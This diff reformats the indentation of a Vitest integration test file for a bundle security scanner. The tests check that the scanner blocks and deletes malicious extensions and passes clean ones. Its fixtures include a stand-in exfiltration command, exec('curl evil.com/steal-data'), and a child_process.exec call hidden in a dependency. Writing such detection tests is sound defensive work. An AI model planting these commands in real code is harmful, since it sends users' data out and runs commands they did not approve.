@@ -7,173 +7,173 @@ import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { runEffect } from "../setup/effect-test-utils";
 
 describe("Bundle Security Orchestration (Integration)", () => {
-	let testDir: string;
+  let testDir: string;
 
-	beforeEach(async () => {
-		testDir = await mkdtemp(
-			join(tmpdir(), `bundle-security-integration-${Date.now()}-`),
-		);
-	});
+  beforeEach(async () => {
+    testDir = await mkdtemp(
+      join(tmpdir(), `bundle-security-integration-${Date.now()}-`),
+    );
+  });
 
-	afterEach(async () => {
-		await rm(testDir, { recursive: true, force: true });
-	});
+  afterEach(async () => {
+    await rm(testDir, { recursive: true, force: true });
+  });
 
-	it("blocks deployment and deletes artifact when malicious code detected", async () => {
-		// Create malicious extension
-		const extDir = join(testDir, "evil-ext");
-		await mkdir(extDir, { recursive: true });
+  it("blocks deployment and deletes artifact when malicious code detected", async () => {
+    // Create malicious extension
+    const extDir = join(testDir, "evil-ext");
+    await mkdir(extDir, { recursive: true });
 
-		await writeFile(
-			join(extDir, "package.json"),
-			JSON.stringify({
-				name: "evil-ext",
-				version: "1.0.0",
-				main: "index.ts",
-			}),
-		);
+    await writeFile(
+      join(extDir, "package.json"),
+      JSON.stringify({
+        name: "evil-ext",
+        version: "1.0.0",
+        main: "index.ts",
+      }),
+    );
 
-		await writeFile(
-			join(extDir, "index.ts"),
-			`
+    await writeFile(
+      join(extDir, "index.ts"),
+      `
       import { exec } from 'child_process';
       export function hack() {
         exec('curl evil.com/steal-data');
       }
     `,
-		);
+    );
 
-		// Bundle extension (use blocks type since it imports node modules)
-		const bundleResult = await runEffect(
-			bundleExtensionFromDirEffect(extDir, {
-				repoRoot: testDir,
-				timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
-				extensionType: "blocks",
-			}),
-		);
+    // Bundle extension (use blocks type since it imports node modules)
+    const bundleResult = await runEffect(
+      bundleExtensionFromDirEffect(extDir, {
+        repoRoot: testDir,
+        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
+        extensionType: "blocks",
+      }),
+    );
 
-		const artifactPath = bundleResult.artifactPath;
+    const artifactPath = bundleResult.artifactPath;
 
-		// Post-bundle scan should block
-		const scanResult = await runEffect(scanBundleEffect(artifactPath));
-		expect(scanResult.blocked).toBe(true);
+    // Post-bundle scan should block
+    const scanResult = await runEffect(scanBundleEffect(artifactPath));
+    expect(scanResult.blocked).toBe(true);
 
-		// Simulate orchestrator: delete artifact on block
-		await rm(artifactPath, { force: true }).catch(() => {});
-		if (bundleResult.sourcemapPath) {
-			await rm(bundleResult.sourcemapPath, { force: true }).catch(() => {});
-		}
+    // Simulate orchestrator: delete artifact on block
+    await rm(artifactPath, { force: true }).catch(() => {});
+    if (bundleResult.sourcemapPath) {
+      await rm(bundleResult.sourcemapPath, { force: true }).catch(() => {});
+    }
 
-		// Verify artifact deleted
-		await expect(access(artifactPath)).rejects.toThrow();
-	});
+    // Verify artifact deleted
+    await expect(access(artifactPath)).rejects.toThrow();
+  });
 
-	it("allows deployment when bundle is clean", async () => {
-		const extDir = join(testDir, "safe-ext");
-		await mkdir(extDir, { recursive: true });
+  it("allows deployment when bundle is clean", async () => {
+    const extDir = join(testDir, "safe-ext");
+    await mkdir(extDir, { recursive: true });
 
-		await writeFile(
-			join(extDir, "package.json"),
-			JSON.stringify({
-				name: "safe-ext",
-				version: "1.0.0",
-				main: "index.ts",
-			}),
-		);
+    await writeFile(
+      join(extDir, "package.json"),
+      JSON.stringify({
+        name: "safe-ext",
+        version: "1.0.0",
+        main: "index.ts",
+      }),
+    );
 
-		await writeFile(
-			join(extDir, "index.ts"),
-			`
+    await writeFile(
+      join(extDir, "index.ts"),
+      `
       export function greet(name: string) {
         return \`Hello, \${name}!\`;
       }
     `,
-		);
+    );
 
-		const bundleResult = await runEffect(
-			bundleExtensionFromDirEffect(extDir, {
-				repoRoot: testDir,
-				timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
-			}),
-		);
-		const scanResult = await runEffect(
-			scanBundleEffect(bundleResult.artifactPath),
-		);
+    const bundleResult = await runEffect(
+      bundleExtensionFromDirEffect(extDir, {
+        repoRoot: testDir,
+        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
+      }),
+    );
+    const scanResult = await runEffect(
+      scanBundleEffect(bundleResult.artifactPath),
+    );
 
-		expect(scanResult.blocked).toBe(false);
-		expect(scanResult.findings).toHaveLength(0);
+    expect(scanResult.blocked).toBe(false);
+    expect(scanResult.findings).toHaveLength(0);
 
-		// Artifact should NOT be deleted for clean bundles
-		await expect(access(bundleResult.artifactPath)).resolves.toBeUndefined();
-	});
+    // Artifact should NOT be deleted for clean bundles
+    await expect(access(bundleResult.artifactPath)).resolves.toBeUndefined();
+  });
 
-	it("detects malicious dependency in bundled code", async () => {
-		// Create extension that imports malicious dependency
-		const extDir = join(testDir, "ext-with-bad-dep");
-		await mkdir(extDir, { recursive: true });
+  it("detects malicious dependency in bundled code", async () => {
+    // Create extension that imports malicious dependency
+    const extDir = join(testDir, "ext-with-bad-dep");
+    await mkdir(extDir, { recursive: true });
 
-		await writeFile(
-			join(extDir, "package.json"),
-			JSON.stringify({
-				name: "ext-with-bad-dep",
-				version: "1.0.0",
-				main: "index.ts",
-			}),
-		);
+    await writeFile(
+      join(extDir, "package.json"),
+      JSON.stringify({
+        name: "ext-with-bad-dep",
+        version: "1.0.0",
+        main: "index.ts",
+      }),
+    );
 
-		// Extension code looks safe, but imports malicious module
-		await writeFile(
-			join(extDir, "index.ts"),
-			`
+    // Extension code looks safe, but imports malicious module
+    await writeFile(
+      join(extDir, "index.ts"),
+      `
       import { dangerousFunction } from './malicious-dep';
       export { dangerousFunction };
     `,
-		);
+    );
 
-		await writeFile(
-			join(extDir, "malicious-dep.ts"),
-			`
+    await writeFile(
+      join(extDir, "malicious-dep.ts"),
+      `
       const child_process = require('child_process');
       export function dangerousFunction() {
         child_process.exec('whoami');
       }
     `,
-		);
+    );
 
-		// Use blocks type since it requires node module (child_process)
-		const bundleResult = await runEffect(
-			bundleExtensionFromDirEffect(extDir, {
-				repoRoot: testDir,
-				timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
-				extensionType: "blocks",
-			}),
-		);
-		const scanResult = await runEffect(
-			scanBundleEffect(bundleResult.artifactPath),
-		);
+    // Use blocks type since it requires node module (child_process)
+    const bundleResult = await runEffect(
+      bundleExtensionFromDirEffect(extDir, {
+        repoRoot: testDir,
+        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
+        extensionType: "blocks",
+      }),
+    );
+    const scanResult = await runEffect(
+      scanBundleEffect(bundleResult.artifactPath),
+    );
 
-		// Should detect child_process in bundled dependency
-		expect(scanResult.blocked).toBe(true);
-		expect(scanResult.findings.some((f) => f.ruleId === "SEC102")).toBe(true);
-	});
+    // Should detect child_process in bundled dependency
+    expect(scanResult.blocked).toBe(true);
+    expect(scanResult.findings.some((f) => f.ruleId === "SEC102")).toBe(true);
+  });
 
-	it("does NOT alert on legitimate base64/prototype usage (false positive test)", async () => {
-		const extDir = join(testDir, "legit-ext");
-		await mkdir(extDir, { recursive: true });
+  it("does NOT alert on legitimate base64/prototype usage (false positive test)", async () => {
+    const extDir = join(testDir, "legit-ext");
+    await mkdir(extDir, { recursive: true });
 
-		await writeFile(
-			join(extDir, "package.json"),
-			JSON.stringify({
-				name: "legit-ext",
-				version: "1.0.0",
-				main: "index.ts",
-			}),
-		);
+    await writeFile(
+      join(extDir, "package.json"),
+      JSON.stringify({
+        name: "legit-ext",
+        version: "1.0.0",
+        main: "index.ts",
+      }),
+    );
 
-		// Code that SHOULD NOT trigger alerts despite containing patterns
-		await writeFile(
-			join(extDir, "index.ts"),
-			`
+    // Code that SHOULD NOT trigger alerts despite containing patterns
+    await writeFile(
+      join(extDir, "index.ts"),
+      `
       // Legitimate base64 for image rendering (not code execution)
       export function renderLogo() {
         const imageData = atob('iVBORw0KGgoAAAANSUhEUgAAAAUA' + 
@@ -204,25 +204,25 @@ describe("Bundle Security Orchestration (Integration)", () => {
         }
       }
     `,
-		);
+    );
 
-		const bundleResult = await runEffect(
-			bundleExtensionFromDirEffect(extDir, {
-				repoRoot: testDir,
-				timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
-			}),
-		);
-		const scanResult = await runEffect(
-			scanBundleEffect(bundleResult.artifactPath),
-		);
+    const bundleResult = await runEffect(
+      bundleExtensionFromDirEffect(extDir, {
+        repoRoot: testDir,
+        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
+      }),
+    );
+    const scanResult = await runEffect(
+      scanBundleEffect(bundleResult.artifactPath),
+    );
 
-		// Should NOT block - all patterns are legitimate usage
-		expect(scanResult.blocked).toBe(false);
+    // Should NOT block - all patterns are legitimate usage
+    expect(scanResult.blocked).toBe(false);
 
-		// May have zero findings, or only low-severity warnings
-		const blockingFindings = scanResult.findings.filter(
-			(f) => f.severity === "block",
-		);
-		expect(blockingFindings).toHaveLength(0);
-	});
+    // May have zero findings, or only low-severity warnings
+    const blockingFindings = scanResult.findings.filter(
+      (f) => f.severity === "block",
+    );
+    expect(blockingFindings).toHaveLength(0);
+  });
 });
